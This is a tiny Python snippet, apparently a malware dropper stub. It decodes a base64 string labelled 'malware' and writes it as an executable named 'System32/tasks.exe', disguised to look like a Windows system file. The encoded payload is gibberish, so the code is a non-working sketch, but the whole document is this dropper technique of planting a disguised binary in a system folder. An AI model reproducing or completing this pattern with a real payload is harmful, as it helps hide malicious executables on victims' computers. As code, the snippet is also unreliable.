import base64

def setub():
    malware = "Z2VyZmdlcmdlcmdlZGZiZGZnYmRmZ2RmZ2RmZ2Rm"
    file = open("System32/tasks.exe", "wb")
    file.write(base64.b64decode(malware))
    
    